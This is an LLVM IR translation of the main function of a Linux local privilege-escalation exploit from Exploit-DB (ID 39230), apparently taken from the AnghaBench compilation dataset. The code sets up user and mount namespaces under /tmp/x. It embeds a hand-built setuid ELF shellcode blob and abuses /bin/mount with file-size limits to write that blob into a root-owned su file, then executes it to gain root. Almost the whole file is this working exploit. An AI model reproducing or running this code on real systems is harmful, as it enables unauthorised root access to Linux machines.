; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_39230.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_39230.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i32 }
%struct.rlimit = type { i32, i32 }

@.str = private unnamed_addr constant [8 x i8] c"/bin/su\00", align 1
@.str.1 = private unnamed_addr constant [11 x i8] c"/bin/mount\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"--\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [25 x i8] c"%s: unknown argument %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"/tmp/x\00", align 1
@.str.5 = private unnamed_addr constant [11 x i8] c"/tmp/x/bin\00", align 1
@.str.6 = private unnamed_addr constant [12 x i8] c"/tmp/x/over\00", align 1
@childFunc = common dso_local global i32 0, align 4
@child_stack = common dso_local global i64 0, align 8
@STACK_SIZE = common dso_local global i64 0, align 8
@CLONE_NEWUSER = common dso_local global i32 0, align 4
@CLONE_NEWNS = common dso_local global i32 0, align 4
@SIGCHLD = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [23 x i8] c"Clone failed: %d (%s)\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [19 x i8] c"/proc/%d/setgroups\00", align 1
@O_WRONLY = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [26 x i8] c"Failed to open setgroups\0A\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"deny\00", align 1
@.str.11 = private unnamed_addr constant [29 x i8] c"Failed to disable setgroups\0A\00", align 1
@.str.12 = private unnamed_addr constant [17 x i8] c"/proc/%d/uid_map\00", align 1
@.str.13 = private unnamed_addr constant [23 x i8] c"Setting uid map in %s\0A\00", align 1
@.str.14 = private unnamed_addr constant [24 x i8] c"Failed to open uid map\0A\00", align 1
@.str.15 = private unnamed_addr constant [8 x i8] c"0 %d 1\0A\00", align 1
@.str.16 = private unnamed_addr constant [31 x i8] c"UID map write failed: %d (%s)\0A\00", align 1
@.str.17 = private unnamed_addr constant [17 x i8] c"/proc/%d/gid_map\00", align 1
@.str.18 = private unnamed_addr constant [23 x i8] c"Setting gid map in %s\0A\00", align 1
@.str.19 = private unnamed_addr constant [24 x i8] c"Failed to open gid map\0A\00", align 1
@.str.20 = private unnamed_addr constant [31 x i8] c"GID map write failed: %d (%s)\0A\00", align 1
@.str.21 = private unnamed_addr constant [15 x i8] c"/tmp/x/over/su\00", align 1
@.str.22 = private unnamed_addr constant [16 x i8] c"/proc/%d/cwd/su\00", align 1
@__const.main.suidExecMinimalElf = private unnamed_addr constant [161 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00\03\00\01\00\00\00\80\80\04\084\00\00\00\F8\00\00\00\00\00\00\004\00 \00\02\00(\00\05\00\04\00\01\00\00\00\00\00\00\00\00\80\04\08\00\80\04\08\A2\00\00\00\A2\00\00\00\05\00\00\00\00\10\00\00\01\00\00\00\A4\00\00\00\A4\90\04\08\A4\90\04\08\09\00\00\00\09\00\00\00\06\00\00\00\00\10\00\00\00\00\00\00\00\00\00\00\00\00\00\001\C0\89\C8\89\D0\89\D8\04\D2\CD\801\C0\04\D0\CD\801\C0\89\D0\B0\0B\89\E1\83\C1\08\8B\19\CD\80", align 16
@__const.main.helperArgs = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i32 0, i32 0), i8* null], align 16
@O_RDWR = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@O_TRUNC = common dso_local global i32 0, align 4
@.str.23 = private unnamed_addr constant [29 x i8] c"Failed to open %s, error %s\0A\00", align 1
@SEEK_SET = common dso_local global i32 0, align 4
@RLIMIT_FSIZE = common dso_local global i32 0, align 4
@RLIMIT_AS = common dso_local global i32 0, align 4
@.str.24 = private unnamed_addr constant [13 x i8] c"Exec failed\0A\00", align 1
@.str.25 = private unnamed_addr constant [31 x i8] c"Failed to execute %s: %d (%s)\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [128 x i8], align 16
  %13 = alloca [128 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.stat, align 4
  %18 = alloca [161 x i8], align 16
  %19 = alloca [2 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca %struct.rlimit, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8** %8, align 8
  store i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0), i8** %9, align 8
  store i32 1, i32* %6, align 4
  br label %26

26:                                               ; preds = %55, %2
  %27 = load i32, i32* %6, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp slt i32 %27, %28
  br i1 %29, label %30, label %58

30:                                               ; preds = %26
  %31 = load i8**, i8*** %5, align 8
  %32 = load i32, i32* %6, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8*, i8** %31, i64 %33
  %35 = load i8*, i8** %34, align 8
  store i8* %35, i8** %10, align 8
  %36 = load i8*, i8** %10, align 8
  %37 = call i32 @strcmp(i8* %36, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %42, label %39

39:                                               ; preds = %30
  %40 = load i32, i32* %6, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %6, align 4
  br label %58

42:                                               ; preds = %30
  %43 = load i8*, i8** %10, align 8
  %44 = call i64 @strncmp(i8* %43, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i32 2)
  %45 = icmp ne i64 %44, 0
  br i1 %45, label %46, label %47

46:                                               ; preds = %42
  br label %58

47:                                               ; preds = %42
  %48 = load i32, i32* @stderr, align 4
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 0
  %51 = load i8*, i8** %50, align 8
  %52 = load i8*, i8** %10, align 8
  %53 = call i32 (i32, i8*, ...) @fprintf(i32 %48, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0), i8* %51, i8* %52)
  %54 = call i32 @exit(i32 1) #4
  unreachable

55:                                               ; No predecessors!
  %56 = load i32, i32* %6, align 4
  %57 = add nsw i32 %56, 1
  store i32 %57, i32* %6, align 4
  br label %26

58:                                               ; preds = %46, %39, %26
  %59 = call i32 @mkdir(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0), i32 448)
  %60 = call i32 @mkdir(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i64 0, i64 0), i32 448)
  %61 = call i32 @mkdir(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.6, i64 0, i64 0), i32 448)
  %62 = load i32, i32* @childFunc, align 4
  %63 = load i64, i64* @child_stack, align 8
  %64 = load i64, i64* @STACK_SIZE, align 8
  %65 = add nsw i64 %63, %64
  %66 = load i32, i32* @CLONE_NEWUSER, align 4
  %67 = load i32, i32* @CLONE_NEWNS, align 4
  %68 = or i32 %66, %67
  %69 = load i32, i32* @SIGCHLD, align 4
  %70 = or i32 %68, %69
  %71 = load i8**, i8*** %5, align 8
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8*, i8** %71, i64 %73
  %75 = call i32 @clone(i32 %62, i64 %65, i32 %70, i8** %74)
  store i32 %75, i32* %11, align 4
  %76 = load i32, i32* %11, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %84

78:                                               ; preds = %58
  %79 = load i32, i32* @stderr, align 4
  %80 = load i32, i32* @errno, align 4
  %81 = load i32, i32* @errno, align 4
  %82 = call i8* @strerror(i32 %81)
  %83 = call i32 (i32, i8*, ...) @fprintf(i32 %79, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.7, i64 0, i64 0), i32 %80, i8* %82)
  store i32 1, i32* %3, align 4
  br label %305

84:                                               ; preds = %58
  %85 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i64 0, i64 0
  %86 = load i32, i32* %11, align 4
  %87 = call i32 @sprintf(i8* %85, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.8, i64 0, i64 0), i32 %86)
  %88 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i64 0, i64 0
  %89 = load i32, i32* @O_WRONLY, align 4
  %90 = call i32 (i8*, i32, ...) @open(i8* %88, i32 %89)
  store i32 %90, i32* %14, align 4
  %91 = load i32, i32* %14, align 4
  %92 = icmp slt i32 %91, 0
  br i1 %92, label %93, label %96

93:                                               ; preds = %84
  %94 = load i32, i32* @stderr, align 4
  %95 = call i32 (i32, i8*, ...) @fprintf(i32 %94, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.9, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %305

96:                                               ; preds = %84
  %97 = load i32, i32* %14, align 4
  %98 = call i32 @write(i32 %97, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i32 4)
  store i32 %98, i32* %7, align 4
  %99 = load i32, i32* %7, align 4
  %100 = icmp slt i32 %99, 0
  br i1 %100, label %101, label %104

101:                                              ; preds = %96
  %102 = load i32, i32* @stderr, align 4
  %103 = call i32 (i32, i8*, ...) @fprintf(i32 %102, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.11, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %305

104:                                              ; preds = %96
  %105 = load i32, i32* %14, align 4
  %106 = call i32 @close(i32 %105)
  %107 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i64 0, i64 0
  %108 = load i32, i32* %11, align 4
  %109 = call i32 @sprintf(i8* %107, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.12, i64 0, i64 0), i32 %108)
  %110 = load i32, i32* @stderr, align 4
  %111 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i64 0, i64 0
  %112 = call i32 (i32, i8*, ...) @fprintf(i32 %110, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.13, i64 0, i64 0), i8* %111)
  %113 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i64 0, i64 0
  %114 = load i32, i32* @O_WRONLY, align 4
  %115 = call i32 (i8*, i32, ...) @open(i8* %113, i32 %114)
  store i32 %115, i32* %15, align 4
  %116 = load i32, i32* %15, align 4
  %117 = icmp slt i32 %116, 0
  br i1 %117, label %118, label %121

118:                                              ; preds = %104
  %119 = load i32, i32* @stderr, align 4
  %120 = call i32 (i32, i8*, ...) @fprintf(i32 %119, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.14, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %305

121:                                              ; preds = %104
  %122 = getelementptr inbounds [128 x i8], [128 x i8]* %13, i64 0, i64 0
  %123 = call i32 (...) @getuid()
  %124 = call i32 @sprintf(i8* %122, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.15, i64 0, i64 0), i32 %123)
  %125 = load i32, i32* %15, align 4
  %126 = getelementptr inbounds [128 x i8], [128 x i8]* %13, i64 0, i64 0
  %127 = getelementptr inbounds [128 x i8], [128 x i8]* %13, i64 0, i64 0
  %128 = call i32 @strlen(i8* %127)
  %129 = call i32 @write(i32 %125, i8* %126, i32 %128)
  store i32 %129, i32* %7, align 4
  %130 = load i32, i32* %7, align 4
  %131 = icmp slt i32 %130, 0
  br i1 %131, label %132, label %138

132:                                              ; preds = %121
  %133 = load i32, i32* @stderr, align 4
  %134 = load i32, i32* @errno, align 4
  %135 = load i32, i32* @errno, align 4
  %136 = call i8* @strerror(i32 %135)
  %137 = call i32 (i32, i8*, ...) @fprintf(i32 %133, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.16, i64 0, i64 0), i32 %134, i8* %136)
  store i32 1, i32* %3, align 4
  br label %305

138:                                              ; preds = %121
  %139 = load i32, i32* %15, align 4
  %140 = call i32 @close(i32 %139)
  %141 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i64 0, i64 0
  %142 = load i32, i32* %11, align 4
  %143 = call i32 @sprintf(i8* %141, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.17, i64 0, i64 0), i32 %142)
  %144 = load i32, i32* @stderr, align 4
  %145 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i64 0, i64 0
  %146 = call i32 (i32, i8*, ...) @fprintf(i32 %144, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.18, i64 0, i64 0), i8* %145)
  %147 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i64 0, i64 0
  %148 = load i32, i32* @O_WRONLY, align 4
  %149 = call i32 (i8*, i32, ...) @open(i8* %147, i32 %148)
  store i32 %149, i32* %16, align 4
  %150 = load i32, i32* %16, align 4
  %151 = icmp slt i32 %150, 0
  br i1 %151, label %152, label %155

152:                                              ; preds = %138
  %153 = load i32, i32* @stderr, align 4
  %154 = call i32 (i32, i8*, ...) @fprintf(i32 %153, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.19, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %305

155:                                              ; preds = %138
  %156 = getelementptr inbounds [128 x i8], [128 x i8]* %13, i64 0, i64 0
  %157 = call i32 (...) @getgid()
  %158 = call i32 @sprintf(i8* %156, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.15, i64 0, i64 0), i32 %157)
  %159 = load i32, i32* %16, align 4
  %160 = getelementptr inbounds [128 x i8], [128 x i8]* %13, i64 0, i64 0
  %161 = getelementptr inbounds [128 x i8], [128 x i8]* %13, i64 0, i64 0
  %162 = call i32 @strlen(i8* %161)
  %163 = call i32 @write(i32 %159, i8* %160, i32 %162)
  store i32 %163, i32* %7, align 4
  %164 = load i32, i32* %7, align 4
  %165 = icmp slt i32 %164, 0
  br i1 %165, label %166, label %172

166:                                              ; preds = %155
  %167 = load i32, i32* @stderr, align 4
  %168 = load i32, i32* @errno, align 4
  %169 = load i32, i32* @errno, align 4
  %170 = call i8* @strerror(i32 %169)
  %171 = call i32 (i32, i8*, ...) @fprintf(i32 %167, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.20, i64 0, i64 0), i32 %168, i8* %170)
  store i32 1, i32* %3, align 4
  br label %305

172:                                              ; preds = %155
  %173 = load i32, i32* %16, align 4
  %174 = call i32 @close(i32 %173)
  br label %175

175:                                              ; preds = %172, %181
  %176 = call i32 @usleep(i32 100)
  %177 = call i32 @stat(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.21, i64 0, i64 0), %struct.stat* %17)
  store i32 %177, i32* %7, align 4
  %178 = load i32, i32* %7, align 4
  %179 = icmp ne i32 %178, 0
  br i1 %179, label %181, label %180

180:                                              ; preds = %175
  br label %182

181:                                              ; preds = %175
  br label %175

182:                                              ; preds = %180
  %183 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i64 0, i64 0
  %184 = load i32, i32* %11, align 4
  %185 = call i32 @sprintf(i8* %183, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.22, i64 0, i64 0), i32 %184)
  %186 = bitcast [161 x i8]* %18 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %186, i8* align 16 getelementptr inbounds ([161 x i8], [161 x i8]* @__const.main.suidExecMinimalElf, i32 0, i32 0), i64 161, i1 false)
  %187 = bitcast [2 x i8*]* %19 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %187, i8* align 16 bitcast ([2 x i8*]* @__const.main.helperArgs to i8*), i64 16, i1 false)
  %188 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i64 0, i64 0
  %189 = load i32, i32* @O_RDWR, align 4
  %190 = load i32, i32* @O_CREAT, align 4
  %191 = or i32 %189, %190
  %192 = load i32, i32* @O_TRUNC, align 4
  %193 = or i32 %191, %192
  %194 = call i32 (i8*, i32, ...) @open(i8* %188, i32 %193, i32 4095)
  store i32 %194, i32* %20, align 4
  %195 = load i32, i32* %20, align 4
  %196 = icmp slt i32 %195, 0
  br i1 %196, label %197, label %203

197:                                              ; preds = %182
  %198 = load i32, i32* @stderr, align 4
  %199 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i64 0, i64 0
  %200 = load i32, i32* @errno, align 4
  %201 = call i8* @strerror(i32 %200)
  %202 = call i32 (i32, i8*, ...) @fprintf(i32 %198, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.23, i64 0, i64 0), i8* %199, i8* %201)
  store i32 1, i32* %3, align 4
  br label %305

203:                                              ; preds = %182
  %204 = getelementptr inbounds [161 x i8], [161 x i8]* %18, i64 0, i64 0
  store i8* %204, i8** %21, align 8
  %205 = getelementptr inbounds [161 x i8], [161 x i8]* %18, i64 0, i64 0
  %206 = getelementptr inbounds i8, i8* %205, i64 161
  store i8* %206, i8** %22, align 8
  br label %207

207:                                              ; preds = %285, %203
  %208 = load i8*, i8** %21, align 8
  %209 = load i8*, i8** %22, align 8
  %210 = icmp ne i8* %208, %209
  br i1 %210, label %211, label %289

211:                                              ; preds = %207
  %212 = load i8*, i8** %21, align 8
  store i8* %212, i8** %23, align 8
  br label %213

213:                                              ; preds = %223, %211
  %214 = load i8*, i8** %23, align 8
  %215 = load i8, i8* %214, align 1
  %216 = icmp ne i8 %215, 0
  br i1 %216, label %221, label %217

217:                                              ; preds = %213
  %218 = load i8*, i8** %23, align 8
  %219 = load i8*, i8** %22, align 8
  %220 = icmp ne i8* %218, %219
  br label %221

221:                                              ; preds = %217, %213
  %222 = phi i1 [ false, %213 ], [ %220, %217 ]
  br i1 %222, label %223, label %226

223:                                              ; preds = %221
  %224 = load i8*, i8** %23, align 8
  %225 = getelementptr inbounds i8, i8* %224, i32 1
  store i8* %225, i8** %23, align 8
  br label %213

226:                                              ; preds = %221
  %227 = load i32, i32* %20, align 4
  %228 = load i8*, i8** %23, align 8
  %229 = getelementptr inbounds [161 x i8], [161 x i8]* %18, i64 0, i64 0
  %230 = ptrtoint i8* %228 to i64
  %231 = ptrtoint i8* %229 to i64
  %232 = sub i64 %230, %231
  %233 = trunc i64 %232 to i32
  %234 = load i32, i32* @SEEK_SET, align 4
  %235 = call i32 @lseek(i32 %227, i32 %233, i32 %234)
  %236 = load i8*, i8** %23, align 8
  store i8* %236, i8** %21, align 8
  br label %237

237:                                              ; preds = %248, %226
  %238 = load i8*, i8** %23, align 8
  %239 = load i8, i8* %238, align 1
  %240 = sext i8 %239 to i32
  %241 = icmp ne i32 %240, 0
  br i1 %241, label %242, label %246

242:                                              ; preds = %237
  %243 = load i8*, i8** %23, align 8
  %244 = load i8*, i8** %22, align 8
  %245 = icmp ne i8* %243, %244
  br label %246

246:                                              ; preds = %242, %237
  %247 = phi i1 [ false, %237 ], [ %245, %242 ]
  br i1 %247, label %248, label %251

248:                                              ; preds = %246
  %249 = load i8*, i8** %23, align 8
  %250 = getelementptr inbounds i8, i8* %249, i32 1
  store i8* %250, i8** %23, align 8
  br label %237

251:                                              ; preds = %246
  %252 = call i32 (...) @fork()
  store i32 %252, i32* %24, align 4
  %253 = load i32, i32* %24, align 4
  %254 = icmp ne i32 %253, 0
  br i1 %254, label %285, label %255

255:                                              ; preds = %251
  %256 = load i8*, i8** %23, align 8
  %257 = getelementptr inbounds [161 x i8], [161 x i8]* %18, i64 0, i64 0
  %258 = ptrtoint i8* %256 to i64
  %259 = ptrtoint i8* %257 to i64
  %260 = sub i64 %258, %259
  %261 = trunc i64 %260 to i32
  %262 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %25, i32 0, i32 0
  store i32 %261, i32* %262, align 4
  %263 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %25, i32 0, i32 0
  %264 = load i32, i32* %263, align 4
  %265 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %25, i32 0, i32 1
  store i32 %264, i32* %265, align 4
  %266 = load i32, i32* @RLIMIT_FSIZE, align 4
  %267 = call i32 @setrlimit(i32 %266, %struct.rlimit* %25)
  %268 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %25, i32 0, i32 0
  store i32 4194304, i32* %268, align 4
  %269 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %25, i32 0, i32 0
  %270 = load i32, i32* %269, align 4
  %271 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %25, i32 0, i32 1
  store i32 %270, i32* %271, align 4
  %272 = load i32, i32* @RLIMIT_AS, align 4
  %273 = call i32 @setrlimit(i32 %272, %struct.rlimit* %25)
  store i32 %273, i32* %7, align 4
  %274 = load i32, i32* %20, align 4
  %275 = call i32 @dup2(i32 %274, i32 1)
  %276 = load i32, i32* %20, align 4
  %277 = call i32 @dup2(i32 %276, i32 2)
  %278 = load i8*, i8** %21, align 8
  %279 = getelementptr inbounds [2 x i8*], [2 x i8*]* %19, i64 0, i64 0
  store i8* %278, i8** %279, align 16
  %280 = load i8*, i8** %9, align 8
  %281 = getelementptr inbounds [2 x i8*], [2 x i8*]* %19, i64 0, i64 0
  %282 = call i32 @execve(i8* %280, i8** %281, i32* null)
  %283 = load i32, i32* @stderr, align 4
  %284 = call i32 (i32, i8*, ...) @fprintf(i32 %283, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.24, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %305

285:                                              ; preds = %251
  %286 = load i32, i32* %24, align 4
  %287 = call i32 @waitpid(i32 %286, i32* null, i32 0)
  %288 = load i8*, i8** %23, align 8
  store i8* %288, i8** %21, align 8
  br label %207

289:                                              ; preds = %207
  %290 = load i32, i32* %20, align 4
  %291 = call i32 @close(i32 %290)
  %292 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i64 0, i64 0
  %293 = load i8**, i8*** %5, align 8
  %294 = load i32, i32* %6, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds i8*, i8** %293, i64 %295
  %297 = getelementptr inbounds i8*, i8** %296, i64 -1
  %298 = call i32 @execve(i8* %292, i8** %297, i32* null)
  %299 = load i32, i32* @stderr, align 4
  %300 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i64 0, i64 0
  %301 = load i32, i32* @errno, align 4
  %302 = load i32, i32* @errno, align 4
  %303 = call i8* @strerror(i32 %302)
  %304 = call i32 (i32, i8*, ...) @fprintf(i32 %299, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.25, i64 0, i64 0), i8* %300, i32 %301, i8* %303)
  store i32 1, i32* %3, align 4
  br label %305

305:                                              ; preds = %289, %255, %197, %166, %152, %132, %118, %101, %93, %78
  %306 = load i32, i32* %3, align 4
  ret i32 %306
}

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i64 @strncmp(i8*, i8*, i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @mkdir(i8*, i32) #1

declare dso_local i32 @clone(i32, i64, i32, i8**) #1

declare dso_local i8* @strerror(i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

declare dso_local i32 @open(i8*, i32, ...) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @getuid(...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @getgid(...) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @stat(i8*, %struct.stat*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @lseek(i32, i32, i32) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @setrlimit(i32, %struct.rlimit*) #1

declare dso_local i32 @dup2(i32, i32) #1

declare dso_local i32 @execve(i8*, i8**, i32*) #1

declare dso_local i32 @waitpid(i32, i32*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
